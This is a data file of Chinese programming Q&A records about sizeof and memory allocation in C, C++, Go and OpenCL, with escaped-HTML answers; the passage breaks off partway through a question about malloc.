{"Answer": "&lt;p&gt;该回答引用GPTᴼᴾᴱᴺᴬᴵ&lt;br /&gt;这段代码的输出应该是&amp;#xff1a;&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;sizeof&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(pnData1)&lt;/span&gt;&lt;/span&gt; &amp;#61; &lt;span class=\"hljs-number\"&gt;60&lt;/span&gt;\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;sizeof&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(pnData1 &amp;#43; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt; &amp;#61; &lt;span class=\"hljs-number\"&gt;4&lt;/span&gt;\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;sizeof&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(pnData1[&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;])&lt;/span&gt;&lt;/span&gt; &amp;#61; &lt;span class=\"hljs-number\"&gt;20&lt;/span&gt;\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;sizeof&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(pnData1[&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;] &amp;#43; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt; &amp;#61; &lt;span class=\"hljs-number\"&gt;4&lt;/span&gt;\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;sizeof&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(*pnData1)&lt;/span&gt;&lt;/span&gt; &amp;#61; &lt;span class=\"hljs-number\"&gt;20&lt;/span&gt;\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;sizeof&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(pnData2)&lt;/span&gt;&lt;/span&gt; &amp;#61; &lt;span class=\"hljs-number\"&gt;4&lt;/span&gt;\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;下面是每个 PRINT_SIZEOF 的解释&amp;#xff1a;&lt;/p&gt;\n&lt;ul&gt;&lt;li&gt;&lt;p&gt;PRINT_SIZEOF(pnData1)&amp;#xff1a;输出 pnData1 整个数组的大小&amp;#xff0c;其中有 3 个元素&amp;#xff0c;每个元素又是一个有 5 个 int 元素的数组&amp;#xff0c;因此大小为 3 * 5 * sizeof(int)&amp;#xff0c;即 60 字节。&lt;/p&gt;\n&lt;/li&gt;&lt;li&gt;&lt;p&gt;PRINT_SIZEOF(pnData1 &amp;#43; 0)&amp;#xff1a;输出 pnData1 &amp;#43; 0 的大小&amp;#xff0c;其中 pnData1 是一个指向 int[5] 数组的指针&amp;#xff0c;加上 0 后仍是指向 int[5] 数组的指针&amp;#xff0c;因此大小为 4 字节&amp;#xff08;32 位平台&amp;#xff09;或 8 字节&amp;#xff08;64 位平台&amp;#xff09;。&lt;/p&gt;\n&lt;/li&gt;&lt;li&gt;&lt;p&gt;PRINT_SIZEOF(pnData1[1])&amp;#xff1a;输出 pnData1 的第二个元素&amp;#xff0c;即 pnData1[1] 的大小&amp;#xff0c;这是一个有 5 个 int 元素的数组&amp;#xff0c;因此大小为 5 * sizeof(int)&amp;#xff0c;即 20 字节。&lt;/p&gt;\n&lt;/li&gt;&lt;li&gt;&lt;p&gt;PRINT_SIZEOF(pnData1[1] &amp;#43; 0)&amp;#xff1a;输出 pnData1[1] &amp;#43; 0 的大小&amp;#xff0c;其中 pnData1[1] 是一个指向 int 的指针&amp;#xff0c;加上 0 后仍是指向 int 的指针&amp;#xff0c;因此大小为 4 字节&amp;#xff08;32 位平台&amp;#xff09;或 8 字节&amp;#xff08;64 位平台&amp;#xff09;。&lt;/p&gt;\n&lt;/li&gt;&lt;li&gt;&lt;p&gt;PRINT_SIZEOF(*pnData1)&amp;#xff1a;输出 *pnData1 的大小&amp;#xff0c;其中 *pnData1 等价于 pnData1[0]&amp;#xff0c;这是一个有 5 个 int 元素的数组&amp;#xff0c;因此大小为 5 * sizeof(int)&amp;#xff0c;即 20 字节。&lt;/p&gt;\n&lt;/li&gt;&lt;li&gt;&lt;p&gt;PRINT_SIZEOF(pnData2)&amp;#xff1a;输出 pnData2 的大小&amp;#xff0c;其中 pnData2 是一个指向 int 的指针&amp;#xff0c;因此大小为 4 字节&amp;#xff08;32 位平台&amp;#xff09;或 8 字节&amp;#xff08;64 位平台&amp;#xff09;。pnData2 实际上是动态分配的内存&amp;#xff0c;因此其大小只包括指针本身&amp;#xff0c;不包括指向的内存块的大小。&lt;/p&gt;\n&lt;/li&gt;&lt;/ul&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["一分钟考考你 —— 测试题2", ["下面这段代码的输出是多少？", "\n\n", "\n", "\n#define PRINT_SIZEOF(a)      printf(\"sizeof(\"#a##\") = %u\\n\", (unsigned int)sizeof(a))\n\nint pnData1[3][5];\nPRINT_SIZEOF(pnData1);\nPRINT_SIZEOF(pnData1 + 0);\nPRINT_SIZEOF(pnData1[1]);\nPRINT_SIZEOF(pnData1[1] + 0);\nPRINT_SIZEOF(*pnData1);\n \nint *pnData2 = new int[6];\nPRINT_SIZEOF(pnData2);"]], "Tag": "程序设计"}
{"Answer": "&lt;div class=\"post-text\" itemprop=\"text\"&gt;\r\n&lt;p&gt;Both slices and strings in Go are struct-like headers:&lt;/p&gt;\n\n&lt;p&gt;&lt;a href=\"https://golang.org/pkg/reflect/#SliceHeader\" rel=\"noreferrer\"&gt;&lt;code&gt;reflect.SliceHeader&lt;/code&gt;&lt;/a&gt;:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;type SliceHeader struct {\n        Data uintptr\n        Len  int\n        Cap  int\n}\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;&lt;a href=\"https://golang.org/pkg/reflect/#StringHeader\" rel=\"noreferrer\"&gt;&lt;code&gt;reflect.StringHeader&lt;/code&gt;&lt;/a&gt;:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;type StringHeader struct {\n        Data uintptr\n        Len  int\n}\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;The sizes reported by &lt;a href=\"https://golang.org/pkg/unsafe/#Sizeof\" rel=\"noreferrer\"&gt;&lt;code&gt;unsafe.Sizeof()&lt;/code&gt;&lt;/a&gt; are the sizes of these headers, exluding the size of the pointed arrays:&lt;/p&gt;\n\n&lt;blockquote&gt;\n  &lt;p&gt;Sizeof takes an expression x of any type and returns the size in bytes of a hypothetical variable v as if v was declared via var v = x. &lt;strong&gt;The size does not include any memory possibly referenced by x.&lt;/strong&gt; For instance, if x is a slice, Sizeof returns the size of the slice descriptor, not the size of the memory referenced by the slice.&lt;/p&gt;\n&lt;/blockquote&gt;\n\n&lt;p&gt;To get the actual (\"recursive\") size of some arbitrary value, use Go's builtin testing and benchmarking framework. For details, see &lt;a href=\"https://stackoverflow.com/questions/44257522/how-to-get-memory-size-of-variable-in-golang/44258164#44258164\"&gt;How to get memory size of variable in Golang?&lt;/a&gt;&lt;/p&gt;\n\n&lt;p&gt;For strings specifically, see &lt;a href=\"https://stackoverflow.com/questions/52851788/string-memory-usage-in-golang/52851967#52851967\"&gt;String memory usage in Golang&lt;/a&gt;. The complete memory required by a &lt;code&gt;string&lt;/code&gt; value can be computed like this:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;var str string = \"some string\"\n\nstringSize := len(str) + unsafe.Sizeof(str)\n&lt;/code&gt;&lt;/pre&gt;\n    &lt;/div&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["GoLang-内存分配-[]字节与字符串", ["\n\n", "In the below code:", "\n\n", "c := \"fool\"\nd := []byte(\"fool\")\nfmt.Printf(\"c: %T, %d\n\", c, unsafe.Sizeof(c)) // 16 bytes\nfmt.Printf(\"d: %T, %d\n\", d, unsafe.Sizeof(d)) // 24 bytes\n", "\n\n", "\n", "To decide the datatype needed to receive JSON data from CloudFoundry, am testing above sample code to understand the memory allocation for ", "[]byte", " vs ", "string", " type.", "\n\n", "\n", "Expected size of ", "string", " type variable ", "c", " is 1 byte x 4 ascii encoded letter = 4 bytes, but the size shows 16 bytes.", "\n\n", "For ", "byte", " type variable ", "d", ", GO embeds the string in the executable program as a string literal. It converts the string literal to a byte slice at runtime using the ", "runtime.stringtoslicebyte", " function. Something like... ", "[]byte{102, 111, 111, 108}", "\n\n", "Expected size of ", "byte", " type variable ", "d", " is again 1 byte x 4 ascii values = 4 bytes but the size of variable ", "d", " shows 24 bytes as it's underlying array capacity.", "\n\n", "\n", "Why the size of both variables is not 4 bytes?", "\n    "]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;这不是一个典型的冒泡排序吗&lt;br /&gt;你写j&amp;#61;0也行&amp;#xff0c;但是前面已经排好了&amp;#xff0c;循环也是浪费时间&lt;br /&gt;memset是给变量进行初始化&amp;#xff0c;把s从头到尾全设置成0&amp;#xff0c;其中memset(a,b,c)&amp;#xff0c;a是数组指针&amp;#xff0c;b是要设置的值&amp;#xff0c;c是长度&amp;#xff08;个数&amp;#xff09;&amp;#xff0c;sizeof(s)就是s占用的内存&lt;br /&gt;这里本来就是把另外的字符串值赋值给s&amp;#xff0c;赋值之前初始化s完全多此一举&amp;#xff0c;删掉即可&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["想问一下第二个循环的内循环为什么要j=i+1，同时memset括号内对s赋予初值为0，后面的sizeof是什么意思呢？", ["想问一下本题的思路大概是什么呀？👶🏻", "就是大概是问题里面的，还有大概思路"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;这个报错很可能是数组越界导致的。但是当前代码看着是没什么问题的。建议看一下 gc_4cell_top()这个函数的输入参数说明&amp;#xff0c;看看输入的参数是否符合接口要求。&lt;br /&gt;感觉问题可能是出在fread(in_a, 4208 * 3120, 2, fp1);这里。你检查一下你的文件格式&amp;#xff0c;这么读出来的数据不一定正确。你打印一部分数据检验一下读取是否正确。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["VS调试 C++工程 ，提示需要查找.cpp已确定当前调用堆栈帧，同时报错内存访问冲突", ["此工程调用了一动态链接库，在运行至其中一函数的调用时报此错误；", "报错需要查找的.cpp文件工程内并未添加，也从未提到。", "该链接库释放者提供的示例工程可以正常调用库，想请问有没有什么尝试的思路，看我的工程有什么问题。", "\n", "gc_4cell_init", "(RMargs);\n", "// in_a是输入4C raw图", "\n", "unsigned", " ", "short", "* in_a = (", "unsigned", " ", "short", "*)", "malloc", "(", "sizeof", "(", "unsigned", " ", "short", ") * (", "4208", " * ", "3120", "));\n", "// out_a是输出bayer raw图", "\n", "unsigned", " ", "short", "* out_a = (", "unsigned", " ", "short", "*)", "malloc", "(", "sizeof", "(", "unsigned", " ", "short", ") * (", "4208", " * ", "3120", "));\n\nFILE* fp1 = ", "fopen", "(", "\"in.raw\"", ", ", "\"rb\"", ");\n", "if", " (fp1) {\n    ", "fread", "(in_a, ", "4208", " * ", "3120", ", ", "2", ", fp1);\n    ", "fclose", "(fp1);\n}\n", "else", " {\n    ", "AfxMessageBox", "(", "\"Cannot open INPUT RAW file for read!\\n\"", ");\n}\nfp1 = ", "fopen", "(", "\"out.raw\"", ", ", "\"wb\"", ");\n\n", "gc_4cell_top", "(in_a, out_a, RMargs);  ", "// 调用此函数时，发生报错", "\n", "// 释放空间", "\n", "gc_4cell_uninit", "();\n\n", "free", "(in_a);\n", "free", "(out_a);\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;函数原型要求你传递的函数指针是一个int(const void*,const void*)类型的&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;void&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;qsort&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(&lt;span class=\"hljs-type\"&gt;void&lt;/span&gt;* base,&lt;span class=\"hljs-type\"&gt;size_t&lt;/span&gt; num,&lt;span class=\"hljs-type\"&gt;size_t&lt;/span&gt; width,&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;(__cdecl*compare)(&lt;span class=\"hljs-keyword\"&gt;const&lt;/span&gt; &lt;span class=\"hljs-type\"&gt;void&lt;/span&gt;*,&lt;span class=\"hljs-keyword\"&gt;const&lt;/span&gt; &lt;span class=\"hljs-type\"&gt;void&lt;/span&gt;*))&lt;/span&gt;&lt;/span&gt;;\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;所以可以将比较函数声明为&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; compare&lt;span class=\"hljs-constructor\"&gt;_integers(&lt;span class=\"hljs-params\"&gt;const&lt;/span&gt; &lt;span class=\"hljs-params\"&gt;void&lt;/span&gt;&lt;span class=\"hljs-operator\"&gt;*&lt;/span&gt; &lt;span class=\"hljs-params\"&gt;_a&lt;/span&gt; , &lt;span class=\"hljs-params\"&gt;const&lt;/span&gt; &lt;span class=\"hljs-params\"&gt;void&lt;/span&gt;&lt;span class=\"hljs-operator\"&gt;*&lt;/span&gt; &lt;span class=\"hljs-params\"&gt;_b&lt;/span&gt;)&lt;/span&gt;\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;在函数中进行强转&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt;* a &amp;#61; (&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt;*)_a;    &lt;span class=\"hljs-comment\"&gt;//强制类型转换&lt;/span&gt;\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;完整的参考&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-built_in\"&gt;num&lt;/span&gt;[&lt;span class=\"hljs-number\"&gt;100&lt;/span&gt;];\n&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; compare_integers(&lt;span class=\"hljs-keyword\"&gt;const&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;void&lt;/span&gt;* _a , &lt;span class=\"hljs-keyword\"&gt;const&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;void&lt;/span&gt;* _b)　　&lt;span class=\"hljs-comment\"&gt;//参数格式固定&lt;/span&gt;\n{\n    &lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt;* a &amp;#61; (&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt;*)_a;    &lt;span class=\"hljs-comment\"&gt;//强制类型转换&lt;/span&gt;\n    &lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt;* b &amp;#61; (&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt;*)_b;\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; *a - *b;　　\n}\nqsort(&lt;span class=\"hljs-built_in\"&gt;num&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;100&lt;/span&gt;,sizeof(&lt;span class=\"hljs-built_in\"&gt;num&lt;/span&gt;[&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;]),compare_integers); \n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["请问为什么这段动态分配内存的代码会出错", ["\n", "//读取一列整数，并按升序排列他们，最后打印这个列表", "\n", "#", "include", " ", "<stdlib.h>", "\n", "#", "include", " ", "<stdio.h>", "\n", "int", " ", "compare_integers", "(", "int", " ", "const", "* a, ", "int", " ", "const", "* b)", "\n", "{\n    ", "register", " ", "int", " ", "const", "* pa = a;\n    ", "register", " ", "int", " ", "const", "* pb = b;\n    ", "return", " *pa > *pb ? ", "1", " : *pa < *pb ? ", "-1", " : ", "0", ";\n}\n", "int", " ", "main", "()", "\n", "{\n    ", "int", " *array;\n    ", "int", " n_values;\n    ", "int", " i;\n    ", "printf", "(", "\"How many values are there?\"", ");\n    ", "if", " (", "scanf", "(", "\"%d\"", ", &n_values) != ", "1", " || n_values <= ", "0", ") {\n        ", "printf", "(", "\"Illegal number of values.\\n\"", ");\n        ", "exit", "(EXIT_FAILURE);\n    }\n    *array=", "malloc", "(n_values * ", "sizeof", "(", "int", "));\n    ", "if", " (array == ", "NULL", ") {\n        ", "printf", "(", "\"Can't get memory for that many values.\\n\"", ");\n        ", "exit", "(EXIT_FAILURE);\n    }\n    ", "for", " (i = ", "0", "; i < n_values; i += ", "1", ") {\n        ", "printf", "(", "\"?\"", ");\n        ", "if", " (", "scanf", "(", "\"%d\"", ", array + i) != ", "1", ") {\n            ", "printf", "(", "\"Error reading value #%d\\n\"", ", i);\n            ", "free", "(array);\n            ", "exit", "(EXIT_FAILURE);\n        }\n    }\n    ", "qsort", "(array, n_values, ", "sizeof", "(", "int", "), compare_integers);\n    ", "for", " (i = ", "0", "; i < n_values; i += ", "1", ")\n        ", "printf", "(", "\"%d\\n\"", ", array[i]);\n    ", "free", "(array);\n    ", "return", " EXIT_SUCCESS;\n}\n\n", "\n", "报错信息如下：", "\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;你好&amp;#xff0c;我是有问必答小助手&amp;#xff0c;非常抱歉&amp;#xff0c;本次您提出的有问必答问题&amp;#xff0c;技术专家团超时未为您做出解答&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;本次提问扣除的有问必答次数&amp;#xff0c;将会以问答VIP体验卡&amp;#xff08;1次有问必答机会、商城购买实体图书享受95折优惠&amp;#xff09;的形式为您补发到账户。&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;因为有问必答VIP体验卡有效期仅有1天&amp;#xff0c;您在需要使用的时候【私信】联系我&amp;#xff0c;我会为您补发。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于mali-T860这款GPU的带宽问题", ["问题遇到的现象和发生背景", "\n", " 我有一块开发板使用的是rk3399这款瑞芯微的芯片，带有一个mali-T860的GPU，烧入了ubuntu18.04系统，系统中有用OpenCL。", "我是用OpenCL测试了GPU带宽性能，发现Device2Host和Host2Device这两个方向的带宽是4000MB/s，而Device2Device这个方向的带宽是2000MB/s。", "请问为何Device2Host和Host2Device这两个方向的带宽会比Device2Device这个方向的带宽多一倍？个人认为因为mali-gpu和cpu是共享内存的，难道不应该是三个方向都差不多吗？", "\n", "问题相关代码，请勿粘贴截图", "\n", "///////////////////////////////////////////////////////////////////////////////", "\n", "//  test the bandwidth of a device to host memcopy of a specific size", "\n", "///////////////////////////////////////////////////////////////////////////////", "\ndouble test", "HostToDeviceTransfer(", "unsigned", " ", "int", " ", "memSize", ", ", "accessMode", " ", "accMode", ", ", "memoryMode", " ", "memMode", ")", "\n{\n    double elapsedTimeInSec = ", "0.0", ";\n    double bandwidthInMBs = ", "0.0", ";\n    unsigned ", "char", "* h_data = NULL;\n    cl_mem cmPinnedData = NULL;\n    cl_mem cmDevData = NULL;\n    cl_int ciErrNum = CL_SUCCESS;\n\n    ", "// Allocate and init host memory, pinned or conventional", "\n    ", "if", "(memMode", " == ", "PINNED)\n   { \n        ", "// Create a host buffer", "\n        cmPinnedData = cl", "CreateBuffer(", "cxGPUContext", ", CL_MEM_READ_WRITE | CL_MEM_ALLOC_HOST_PTR, ", "memSize", ", NULL, &", "ciErrNum", ")", ";\n        ocl", "CheckError(", "ciErrNum", ", CL_SUCCESS)", ";\n\n        ", "// Get a mapped pointer", "\n        h_data = (unsigned ", "char", "*)cl", "EnqueueMapBuffer(", "cqCommandQueue", ", ", "cmPinnedData", ", CL_TRUE, CL_MAP_WRITE, 0, ", "memSize", ", 0, NULL, NULL, &", "ciErrNum", ")", ";\n        ocl", "CheckError(", "ciErrNum", ", CL_SUCCESS)", ";\n\n        ", "//initialize ", "\n        ", "for", "(unsigned ", "int", " i = ", "0", "; i < memSize/sizeof(unsigned ", "char", "); i++)\n        {\n            h_data", "[", "i", "]", " = (unsigned ", "char", ")(i & ", "0xff", ");\n        }\n    \n        ", "// unmap and make data in the host buffer valid", "\n        ciErrNum = cl", "EnqueueUnmapMemObject(", "cqCommandQueue", ", ", "cmPinnedData", ", (", "void", "*", ")", "h_data, ", "0", ", NULL, NULL);\n        ocl", "CheckError(", "ciErrNum", ", CL_SUCCESS)", ";\n        h_data = NULL;  ", "// buffer is unmapped", "\n    }\n    ", "else", " \n    {\n        ", "// standard host alloc", "\n        h_data = (unsigned ", "char", " *)malloc(memSize);\n\n        ", "//initialize ", "\n        ", "for", "(unsigned ", "int", " i = ", "0", "; i < memSize/sizeof(unsigned ", "char", "); i++)\n        {\n            h_data", "[", "i", "]", " = (unsigned ", "char", ")(i & ", "0xff", ");\n        }\n    }\n\n    ", "// allocate device memory ", "\n    cmDevData = cl", "CreateBuffer(", "cxGPUContext", ", CL_MEM_READ_WRITE, ", "memSize", ", NULL, &", "ciErrNum", ")", ";\n    ocl", "CheckError(", "ciErrNum", ", CL_SUCCESS)", ";\n\n    ", "// Sync queue to host, start timer 0, and copy data from Host to GPU", "\n    cl", "Finish(", "cqCommandQueue", ")", ";\n    shr", "DeltaT(0)", ";\n    ", "if", "(accMode", " == ", "DIRECT)\n    { \n        ", "if", "(memMode", " == ", "PINNED) \n        {\n            ", "// Get a mapped pointer", "\n            h_data = (unsigned ", "char", "*)cl", "EnqueueMapBuffer(", "cqCommandQueue", ", ", "cmPinnedData", ", CL_TRUE, CL_MAP_READ, 0, ", "memSize", ", 0, NULL, NULL, &", "ciErrNum", ")", ";\n            ocl", "CheckError(", "ciErrNum", ", CL_SUCCESS)", ";\n        }\n\n        ", "// DIRECT:  API access to device buffer ", "\n        ", "for", "(unsigned ", "int", " i = ", "0", "; i < MEMCOPY_ITERATIONS; i++)\n        {\n                ciErrNum = cl", "EnqueueWriteBuffer(", "cqCommandQueue", ", ", "cmDevData", ", CL_FALSE, 0, ", "memSize", ", ", "h_data", ", 0, NULL, NULL)", ";\n                ocl", "CheckError(", "ciErrNum", ", CL_SUCCESS)", ";\n        }\n        ciErrNum = cl", "Finish(", "cqCommandQueue", ")", ";\n        ocl", "CheckError(", "ciErrNum", ", CL_SUCCESS)", ";\n    } \n    ", "else", " \n    {\n        ", "// MAPPED: mapped pointers to device buffer and conventional pointer access", "\n        void* dm_idata = cl", "EnqueueMapBuffer(", "cqCommandQueue", ", ", "cmDevData", ", CL_TRUE, CL_MAP_WRITE, 0, ", "memSize", ", 0, NULL, NULL, &", "ciErrNum", ")", ";\n        ocl", "CheckError(", "ciErrNum", ", CL_SUCCESS)", ";\n        ", "if", "(memMode", " == ", "PINNED ) \n        {\n            h_data = (unsigned ", "char", "*)cl", "EnqueueMapBuffer(", "cqCommandQueue", ", ", "cmPinnedData", ", CL_TRUE, CL_MAP_READ, 0, ", "memSize", ", 0, NULL, NULL, &", "ciErrNum", ")", "; \n            ocl", "CheckError(", "ciErrNum", ", CL_SUCCESS)", "; \n        } \n        ", "for", "(unsigned ", "int", " i = ", "0", "; i < MEMCOPY_ITERATIONS; i++)\n        {\n            memcpy(dm_idata, h_data, memSize);\n        }\n        ciErrNum = cl", "EnqueueUnmapMemObject(", "cqCommandQueue", ", ", "cmDevData", ", ", "dm_idata", ", 0, NULL, NULL)", ";\n        ocl", "CheckError(", "ciErrNum", ", CL_SUCCESS)", ";\n    }\n    \n    ", "//get the the elapsed time in seconds", "\n    elapsedTimeInSec = shr", "DeltaT(0)", ";\n    \n    ", "//calculate bandwidth in MB/s", "\n    bandwidthInMBs = ((double)memSize", " * ", "(double)MEMCOPY_ITERATIONS)/(elapsedTimeInSec", " * ", "(double)(", "1", " << ", "20", "));\n\n    ", "//clean up memory", "\n    ", "if", "(cmDevData)cl", "ReleaseMemObject(", "cmDevData", ")", ";\n    ", "if", "(cmPinnedData) \n    {\n        cl", "EnqueueUnmapMemObject(", "cqCommandQueue", ", ", "cmPinnedData", ", (", "void", "*", ")", "h_data, ", "0", ", NULL, NULL);\n        cl", "ReleaseMemObject(", "cmPinnedData", ")", ";\n    }\n    h_data = NULL;\n\n    return bandwidthInMBs;\n}\n", "///////////////////////////////////////////////////////////////////////////////", "\n", "//  test the bandwidth of a device to host memcopy of a specific size", "\n", "///////////////////////////////////////////////////////////////////////////////", "\ndouble test", "DeviceToDeviceTransfer(", "unsigned", " ", "int", " ", "memSize", ")", "\n{\n    double elapsedTimeInSec = ", "0.0", ";\n    double bandwidthInMBs = ", "0.0", ";\n    unsigned ", "char", "* h_idata = NULL;\n    cl_int ciErrNum = CL_SUCCESS;\n    \n    ", "//allocate host memory", "\n    h_idata = (unsigned ", "char", " *)malloc( memSize );\n        \n    ", "//initialize the memory", "\n    ", "for", "(unsigned ", "int", " i = ", "0", "; i < memSize/sizeof(unsigned ", "char", "); i++)\n    {\n        h_idata", "[", "i", "]", " = (unsigned ", "char", ") (i & ", "0xff", ");\n    }\n\n    ", "// allocate device input and output memory and initialize the device input memory", "\n    cl_mem d_idata = cl", "CreateBuffer(", "cxGPUContext", ", CL_MEM_READ_ONLY, ", "memSize", ", NULL, &", "ciErrNum", ")", ";\n    ocl", "CheckError(", "ciErrNum", ", CL_SUCCESS)", ";\n    cl_mem d_odata = cl", "CreateBuffer(", "cxGPUContext", ", CL_MEM_WRITE_ONLY, ", "memSize", ", NULL, &", "ciErrNum", ")", ";         \n    ocl", "CheckError(", "ciErrNum", ", CL_SUCCESS)", ";\n    ciErrNum = cl", "EnqueueWriteBuffer(", "cqCommandQueue", ", ", "d_idata", ", CL_TRUE, 0, ", "memSize", ", ", "h_idata", ", 0, NULL, NULL)", ";\n    ocl", "CheckError(", "ciErrNum", ", CL_SUCCESS)", ";\n\n    ", "// Sync queue to host, start timer 0, and copy data from one GPU buffer to another GPU bufffer", "\n    cl", "Finish(", "cqCommandQueue", ")", ";\n    shr", "DeltaT(0)", ";\n    ", "for", "(unsigned ", "int", " i = ", "0", "; i < MEMCOPY_ITERATIONS; i++)\n    {\n        ciErrNum = cl", "EnqueueCopyBuffer(", "cqCommandQueue", ", ", "d_idata", ", ", "d_odata", ", 0, 0, ", "memSize", ", 0, NULL, NULL)", ";                \n        ocl", "CheckError(", "ciErrNum", ", CL_SUCCESS)", ";\n    }    \n\n    ", "// Sync with GPU", "\n    cl", "Finish(", "cqCommandQueue", ")", ";\n    \n    ", "//get the the elapsed time in seconds", "\n    elapsedTimeInSec = shr", "DeltaT(0)", ";\n    \n    ", "// Calculate bandwidth in MB/s ", "\n    ", "//      This is for kernels that read and write GMEM simultaneously ", "\n    ", "//      Obtained Throughput for unidirectional block copies will be 1/2 of this #", "\n    bandwidthInMBs = ", "2.0", " * ", "((double)memSize", " * ", "(double)MEMCOPY_ITERATIONS)/(elapsedTimeInSec", " * ", "(double)(", "1", " << ", "20", "));\n\n    ", "//clean up memory on host and device", "\n    free(h_idata);\n    cl", "ReleaseMemObject(", "d_idata", ")", ";\n    cl", "ReleaseMemObject(", "d_odata", ")", ";\n\n    return bandwidthInMBs;\n}\n\n\n", "\n", "运行结果及报错内容", "\n", "我的解答思路和尝试过的方法", "\n", "我想要达到的结果"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;time确定是个数组吗&amp;#xff1f;不是结构体吗&amp;#xff1f;如果是数组这里就不能出现&amp;amp;的地址了&amp;#xff01;将time的定义截图看下&amp;#xff01;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["fread(&time, sizeof(char), 100, pb);  pb是文件指针\n是把文件的内容存到time数组的哪里呀，为什么time前面加了一个&", ["fread(&time, sizeof(char), 100, pb);  pb是文件指针", "是把文件的内容存到time数组的哪里呀，为什么time前面加了一个&"]], "Tag": "程序设计"}
{"Answer": "&lt;pre&gt;&lt;code class=\"language-c\"&gt; a.array &amp;#61; (&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;*)&lt;span class=\"hljs-built_in\"&gt;malloc&lt;/span&gt;(&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;) * a.size);\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;这一句代码里面的 &lt;code class=\"language-javascript\"&gt;* a.size&lt;/code&gt; 的 &lt;code class=\"language-javascript\"&gt;*&lt;/code&gt; 号和指针没有关系&amp;#xff0c;这个符号在这里就是乘号&amp;#xff0c;这一整条语句的意思是&amp;#xff1a;&lt;br /&gt;使用 &lt;code class=\"language-javascript\"&gt;malloc&lt;/code&gt; 函数 申请 &lt;code class=\"language-javascript\"&gt;a.size&lt;/code&gt; 个 &lt;code class=\"language-javascript\"&gt;int&lt;/code&gt; 类型字节大小的堆内存&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["malloc函数写法问题", ["问题遇到的现象和发生背景", "\n", "学习完顺序表后学习链表，在学习链表过程中需要进行动态内存申请，其中用到了malloc函数和sizeof函数，在对课程代码分析的时候", "遇到了一些问题", "\n", "在array_creat（）函数中，对结构体a的元素a.array进行动态内存分配，malloc函数中sizeof（int）*a.size为什么会这样", "写，我a.size元素明明不是指针类型为什么要用星号表示?", "\n", "用代码块功能插入代码，请勿粘贴截图", "\n", "#", "include", "<stdlib.h>", "\n", "typedef", " ", "struct", " {\n    ", "int", "* array;\n    ", "int", " size;\n}Array;\n", "Array ", "array_creat", "(", "int", " init_size)", " ", "{\n    Array a;\n 